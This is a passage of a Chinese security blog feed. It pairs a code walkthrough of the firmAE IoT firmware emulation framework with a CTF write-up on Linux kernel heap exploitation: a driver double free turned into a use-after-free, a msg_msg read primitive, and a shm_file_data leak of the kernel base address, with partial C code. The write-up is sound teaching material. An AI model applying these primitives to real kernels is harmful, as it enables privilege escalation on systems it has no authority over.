</span><br><span class="line">        <span class="comment"># Checksum</span></span><br><span class="line">        self.checksum = Extractor.io_md5(path)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Tag</span></span><br><span class="line">        self.tag = tag <span class="keyword">if</span> tag <span class="keyword">else</span> self.generate_tag()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Output file path and filename prefix</span></span><br><span class="line">        self.output = os.path.join(self.extractor.output_dir, self.tag) <span class="keyword">if</span> \</span><br><span class="line">                                   self.extractor.output_dir <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Status, with terminate indicating early termination for this item</span></span><br><span class="line">        self.terminate = <span class="literal">False</span></span><br><span class="line">        self.status = <span class="literal">None</span></span><br><span class="line">        self.update_status()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__del__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.database:</span><br><span class="line">            self.database.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> self.temp:</span><br><span class="line">            self.printf(<span class="string">&quot;&gt;&gt; Cleaning up %s...&quot;</span> % self.temp)</span><br><span class="line">            Extractor.io_rm(self.temp)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">printf</span>(<span class="params">self, fmt</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        Prints output string with appropriate depth indentation.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> self.debug:</span><br><span class="line">            print((<span class="string">&quot;\t&quot;</span> * self.depth + fmt))</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><code>generate_tag</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tag</span>(<span class="params">self</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Generate the filename tag.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self.database:</span><br><span class="line">        <span class="keyword">return</span> os.path.basename(self.item) + <span class="string">&quot;_&quot;</span> + self.checksum</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        image_id = <span class="literal">None</span></span><br><span class="line">        cur = self.database.cursor()</span><br><span class="line">        <span class="keyword">if</span> self.extractor.brand:</span><br><span class="line">            brand = self.extractor.brand</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            brand = os.path.relpath(self.item).split(os.path.sep)[<span class="number">0</span>]</span><br><span class="line">        cur.execute(<span class="string">&quot;SELECT id FROM brand WHERE name=%s&quot;</span>, (brand, ))</span><br><span class="line">        brand_id = cur.fetchone()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> brand_id:</span><br><span class="line">            cur.execute(<span class="string">&quot;INSERT INTO brand (name) VALUES (%s) RETURNING id&quot;</span>,</span><br><span class="line">                        (brand, ))</span><br><span class="line">            brand_id = cur.fetchone()</span><br><span class="line">        <span class="keyword">if</span> brand_id:</span><br><span class="line">            cur.execute(<span class="string">&quot;SELECT id FROM image WHERE hash=%s&quot;</span>,</span><br><span class="line">                        (self.checksum, ))</span><br><span class="line">            image_id = cur.fetchone()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> image_id:</span><br><span class="line">                cur.execute(<span class="string">&quot;INSERT INTO image (filename, brand_id, hash) \</span></span><br><span class="line"><span class="string">                            VALUES (%s, %s, %s) RETURNING id&quot;</span>,</span><br><span class="line">                            (os.path.basename(self.item), brand_id[<span class="number">0</span>],</span><br><span class="line">                            self.checksum))</span><br><span class="line">                image_id = cur.fetchone()</span><br><span class="line">        self.database.commit()</span><br><span class="line">    <span class="keyword">except</span> BaseException:</span><br><span class="line">        traceback.print_exc()</span><br><span class="line">        self.database.rollback()</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        <span class="keyword">if</span> cur:</span><br><span class="line">            cur.close()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> image_id:</span><br><span class="line">        self.printf(<span class="string">&quot;&gt;&gt; Database Image ID: %s&quot;</span> % image_id[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str(image_id[<span class="number">0</span>]) <span class="keyword">if</span> \</span><br><span class="line">        image_id <span class="keyword">else</span> os.path.basename(self.item) + <span class="string">&quot;_&quot;</span> + self.checksum</span><br></pre></td></tr></table></figure><h2 id="制作qemu镜像模块"><a href="#制作qemu镜像模块" class="headerlink" title="制作qemu镜像模块"></a>制作qemu镜像模块</h2><p>提取完kernel以及文件系统之后，首先对得到的文件系统检测架构，然后提取内核中核能存在的启动命令，之后就进入到了制作qemu镜像的环节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ================================</span></span><br><span class="line"><span class="comment"># check architecture</span></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line">t_start=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">ARCH=`./scripts/getArch.py ./images/<span class="variable">$IID</span>.tar.gz <span class="variable">$PSQL_IP</span>`</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;ARCH&#125;</span>&quot;</span> &gt; <span class="string">&quot;<span class="variable">$&#123;WORK_DIR&#125;</span>/architecture&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -e ./images/<span class="variable">$&#123;IID&#125;</span>.kernel ]; <span class="keyword">then</span></span><br><span class="line">./scripts/inferKernel.py <span class="variable">$&#123;IID&#125;</span> <span class="comment">#提取内核中可能存在的启动命令</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ ! <span class="string">&quot;<span class="variable">$&#123;ARCH&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[\033[31m-\033[0m] Get architecture failed!&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;get architecture fail&quot;</span> &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/result</span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="keyword">if</span> ( check_arch <span class="variable">$&#123;ARCH&#125;</span> == 0 ); <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;[\033[31m-\033[0m] Unknown architecture! - <span class="variable">$&#123;ARCH&#125;</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;not valid architecture : <span class="variable">$&#123;ARCH&#125;</span>&quot;</span> &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/result</span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[*] get architecture done!!!&quot;</span></span><br><span class="line">t_end=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">time_arch=<span class="string">&quot;<span class="subst">$(bc &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$t_end</span>-<span class="variable">$t_start</span>&quot;</span>)</span>&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$time_arch</span> &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/time_arch</span><br></pre></td></tr></table></figure><p>然后进入到了就是调用<code>makeImage.sh</code>进行qemu镜像的制作，主要的方法是通过挂在一个分区然后将得到的文件系统给拷贝进去，再把一些需要用到的文件：比如<code>firmadyne</code>的文件(libnvram之类的)给拷进去然后再umount。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! egrep -sqi <span class="string">&quot;true&quot;</span> <span class="variable">$&#123;WORK_DIR&#125;</span>/web); <span class="keyword">then</span></span><br><span class="line">    <span class="comment"># ================================</span></span><br><span class="line">    <span class="comment"># make qemu image</span></span><br><span class="line">    <span class="comment"># ================================</span></span><br><span class="line">    t_start=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">    ./scripts/tar2db.py -i <span class="variable">$IID</span> -f ./images/<span class="variable">$IID</span>.tar.gz -h <span class="variable">$PSQL_IP</span> \ </span><br><span class="line">        2&gt;&amp;1 &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/tar2db.log </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;this???&quot;</span></span><br><span class="line">    t_end=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">    time_tar=<span class="string">&quot;<span class="subst">$(bc &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$t_end</span>-<span class="variable">$t_start</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$time_tar</span> &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/time_tar </span><br><span class="line">    t_start=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">    ./scripts/makeImage.sh <span class="variable">$IID</span> <span class="variable">$ARCH</span> <span class="variable">$FILENAME</span> \</span><br><span class="line">        2&gt;&amp;1 &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/makeImage.log</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;END????&quot;</span></span><br><span class="line">    t_end=<span class="string">&quot;<span class="subst">$(date -u +%s.%N)</span>&quot;</span></span><br><span class="line">    time_image=<span class="string">&quot;<span class="subst">$(bc &lt;&lt;&lt;<span class="string">&quot;<span class="variable">$t_end</span>-<span class="variable">$t_start</span>&quot;</span>)</span>&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$time_image</span> &gt; <span class="variable">$&#123;WORK_DIR&#125;</span>/time_image</span><br></pre></td></tr></table></figure><h2 id="推断网络接口模块"><a href="#推断网络接口模块" class="headerlink" title="推断网络接口模块"></a>推断网络接口模块</h2><p>这块有点复杂，简而言之就是根据hook的内核网络接口推断出一些网络配置，然后生成<code>run.sh</code>(包含了qemu运行脚本)，运行qemu。</p><p>以后有时间的话把这个坑填了（x</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;因为最近主要工作是iot模拟，包括利用firmadyne,firmAE等去模拟一些路由器然后去进行模糊测试之类的。所以最好还是把firmAE整个框架分析一下，这样才能知道大概去往什么方向去改进以及优化。&lt;/p&gt;
&lt;p&gt;firmAE是在firmadyne基础上进行开发的，它主</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>内核堆利用相关</title>
    <link href="http://phot0n.com/2023/01/19/%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3/"/>
    <id>http://phot0n.com/2023/01/19/%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3/</id>
    <published>2023-01-19T11:31:29.000Z</published>
    <updated>2023-02-07T06:32:53.890Z</updated>
    
    <content type="html"><![CDATA[<p>最近研究了一下内核堆相关的知识点，主要以题解的形式夹杂着整理，也有一些杂七杂八的内容，在此做一下记录仅供参考。因为我也是刚入门pwn的初学者，所以可能记录会有点啰嗦，敬请谅解</p><h1 id="slub分配"><a href="#slub分配" class="headerlink" title="slub分配"></a>slub分配</h1><p>类似ptmalloc2，内核的堆也有一套管理机制，主要有三种:slub、slab、slob。在平时做kernel题时我们主要接触的是slub分配。关于slub分配的原理可以参考<a href="https://blog.csdn.net/lukuen/article/details/6935068">这篇博客</a> ,我认为描述的十分清晰易懂。同时google上应该能搜到不少相关的介绍</p><p>简要地了解之后我们便可以深入题目来理解了，毕竟实战调试才是加深理解的重要手段</p><h1 id="REALWORDCTF-2023-体验赛-Digging-into-Kernel-3"><a href="#REALWORDCTF-2023-体验赛-Digging-into-Kernel-3" class="headerlink" title="[REALWORDCTF 2023 体验赛] Digging-into-Kernel-3"></a>[REALWORDCTF 2023 体验赛] Digging-into-Kernel-3</h1><h2 id="Pre-提取vmlinux获取符号"><a href="#Pre-提取vmlinux获取符号" class="headerlink" title="Pre.提取vmlinux获取符号"></a>Pre.提取vmlinux获取符号</h2><p>这个<a href="https://github.com/marin-m/vmlinux-to-elf">工具</a> 能够是我们获取带有符号信息的文件，方便打断点调试之类的</p><h2 id="Pre-调试准备"><a href="#Pre-调试准备" class="headerlink" title="Pre.调试准备"></a>Pre.调试准备</h2><p>可以修改run.sh以及init文件以便于调试，比如改nokaslr,或者修改为直接root进系统方便查看驱动加载基地址或者.text段地址，方便载入符号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /sys/module/rwctf/sections/.text</span><br></pre></td></tr></table></figure><p>然后在gdb里面载入符号命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add-symbol-file &lt;file&gt; &lt;address&gt; -s &lt;section_name&gt; &lt;section_base&gt;</span><br></pre></td></tr></table></figure><p>不过有个疑问，如果我想对写的exp进行调试该如何加载符号信息?</p><p>我的一个初步的想法是关闭地址偏移，让exp文件的.text基址固定然后<code>add-symbol-file</code>载入exp</p><p>不过由于gdb调试的时候好像自动关闭了ASLR，所以不用手动关闭了。我们只需要通过IDA找出exp的.text基址，然后载入即可</p><p><img src="https://s2.loli.net/2023/01/21/VyJT4sIxB9eQr7i.png" alt=""></p><p>尝试了一下这样雀食是可以在exp上面下断点进行调试的，不过感觉不够优雅（</p><p><img src="https://s2.loli.net/2023/01/21/jh9ziSInlbBqKEM.png" alt=""></p><h2 id="Analysis-简略分析"><a href="#Analysis-简略分析" class="headerlink" title="Analysis.简略分析"></a>Analysis.简略分析</h2><p>把ko文件拖入IDA分析一下，其逻辑非常简单，我们传入的参数是由序号，大小，还有指向需要传入数据的指针构成的，主要问题在于kfree的时候没有将数组对应项置零，从而导致了Double Free。</p><p><img src="https://s2.loli.net/2023/01/21/y1nFNSTMDUtGv5e.png" alt=""></p><p>这个Double Free可以转换成UAF进行利用。比如我们首先通过这个驱动申请一个object，然后free掉，放入freelist，然后再通过一些系统调用之类的在内核空间申请一个(或者堆喷)一些用到这个size的object的结构体，此时这个系统调用控制了这个object，然后我们再通过驱动再次free掉这个object，那么虽然这个系统调用控制了整个object，但是实际上它已经被free掉了，构成了UAF。所以也就是说我们拥有一个任意size的UAF使用。</p><p>朴素来说kernel提权的思路分为两类，一种是通过一些特殊的结构体的一些操作(比如修改tty的函数表)劫持控制流，一种是直接改进程的cred结构体。二者都离不开内核基址的泄露，所以考虑进一步操作之前我们先思考如何泄露基址</p><h2 id="Analysis-内核基址泄露"><a href="#Analysis-内核基址泄露" class="headerlink" title="Analysis.内核基址泄露"></a>Analysis.内核基址泄露</h2><p>题目提供的驱动本身没有提供含有类似<code>copy_to_user</code>这种向用户态返回数据的函数的功能，所以我们需要用一种通用的办法来泄露基址。一个比较通用的办法是利用<code>msg_msg</code>这个结构体，构成”读的原语”</p><p>这个东西是用来实现进程间通信(IPC)的一个东西。用户可以通过如下函数实现相应的功能</p><ul><li>msgget: 创建消息队列</li><li>msgsnd:向指定消息队列发送消息</li><li>msgrcv: 从指定消息队列接收消息</li></ul><p>比如以下是一个简单的创造队列-发送消息-读取消息的例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msggbuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> mtype;</span><br><span class="line">    <span class="keyword">char</span> mtext[<span class="number">0x50</span>];</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line">&#125; msg;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    msg.mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;msg.mtext,<span class="string">&#x27;A&#x27;</span>,<span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line">    <span class="keyword">int</span> qid = msgget(IPC_PRIVATE,<span class="number">0666</span>|IPC_CREAT);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] QID = %d&quot;</span>,qid);</span><br><span class="line">    msgsnd(qid,&amp;msg,<span class="keyword">sizeof</span>(msg.mtext),<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> * memdump = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] MEM_ADDR = %p&quot;</span>,memdump);</span><br><span class="line">    msgrcv(qid,memdump,<span class="number">0x50</span>,<span class="number">0</span>,IPC_NOWAIT |MSG_NOERROR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>,(<span class="keyword">char</span> *)memdump);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是发送消息时我们必须用<code>struct msggbuf</code>这样的一个结构体来指定<code>type</code>，然后才是我们传送的内容，然后<code>msgsnd</code>和<code>msgrcv</code>的时候指定的<code>size</code>是不包括这个长整型的长度的(本例中也就是不是0x58而是0x50)，但放入memdump的时候似乎其实会有这个type的</p><p><img src="https://s2.loli.net/2023/01/21/6lC2QTaim7GpOkM.png" alt=""></p><p>介绍完使用之后我们再研究内核对这些消息的处理。</p><p>当通过<code>msgget</code>创建一个消息队列时，内核中会创建这样一个结构体用来表示消息队列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="keyword">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="keyword">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="keyword">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>当通过<code>msgsnd</code>在某个消息队列发送一个消息时，内核中会创造这样一个结构体来表示一个消息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="keyword">long</span> m_type;</span><br><span class="line"><span class="keyword">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="keyword">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<code>struct list_head</code>是内核用来提供表示双向循环链表的一个结构，其定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> &#123;</span></span><br><span class="line">　　<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>调用<code>msgsnd</code>时内核最终会调用<code>alloc_msg()</code>函数来分配空间，形成<code>msg_msg</code>结构体以及相应的消息内容，其规则是这样的</p><ul><li>如果消息内容的大小<strong>小于一个页面的大小减去作为header的msg_msg之后的大小(也就是小于0x1000-0x30=0xfd0)</strong>，内核会分配一个size+header_size大小的object，前面0x30(对应msg_msg结构体的大小)存放msg_msg结构体，后面存放消息内容</li><li>如果消息内容大小<strong>大于页面大小减去msg_msg大小(0xfd0)</strong> 那么内核将以单链表的形式将消息内容分片然后组织起来。具体来说，msg_msg结构体里面的<code>struct msg_msgseg *next;</code>将会起作用。被组织起来的第一个消息称为消息头，剩余的称为segment，图解如下</li></ul><p><img src="https://s2.loli.net/2023/01/21/yZufIjwMREvSBrd.png" alt=""></p><p>容易想到的是，如果我们篡改msg_msg的m_ts,把它改大，那么将会实现越界读取，进一步的如果我们能同时篡改<code>m_ts</code>以及<code>struct msg_msgseg *next;</code>，那么我们将可以实现任意地址读。但是有个问题，为了防止访问错误,<code>struct msg_msgseg *next;</code>指向的<code>segment</code>的前8个字节(也就是对应的segment的<code>struct msg_msgseg *next;</code>最好为NULL)(感觉似乎其他合理地址也行？但是必须保证这个链起来的单链表以NULL结尾)。</p><p>对于本题来说，我们希望有一个包含内核地址的结构体，并且其前8个字节为NULL，这样我们就可以通过UAF进行泄露。而恰好有这样一个结构体满足要求</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm_operations_struct</span> *<span class="title">vm_ops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/*输出大致如下</span></span><br><span class="line"><span class="comment">0x0000：0x0000000000000000</span></span><br><span class="line"><span class="comment">0x0008：0xffffffff82292ae0</span></span><br><span class="line"><span class="comment">0x0010：0xffff88800ea09700</span></span><br><span class="line"><span class="comment">0x0018：0xffffffff81e15540</span></span><br><span class="line"><span class="comment">[+] kbase = 0xffffffff81000000</span></span><br><span class="line"><span class="comment">[+] kheap = 0xffff88800ea09700</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>其大小为0x20,前8字节为NULL，并且vm_ops指向内核数据区，可以进行泄露。</p><p>申请的方法如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">open_shm_file</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> shmid;</span><br><span class="line"><span class="keyword">if</span> ((shmid=shmget(IPC_PRIVATE,<span class="number">100</span>,<span class="number">0600</span>))==<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmget Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> *shmaddr=shmat(shmid,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (shmaddr==(<span class="keyword">void</span>*)<span class="number">-1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;[?] Shmat Error&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shmaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面思考的是如何利用UAF进行泄露它。容易想到的是如果我们先通过驱动获取一个shm_file_data大小的object，然后再释放它，让他放入free list。之后我们再申请合适大小的msg_msg，那么会有一个msg_msg的segment命中刚刚那个释放的free 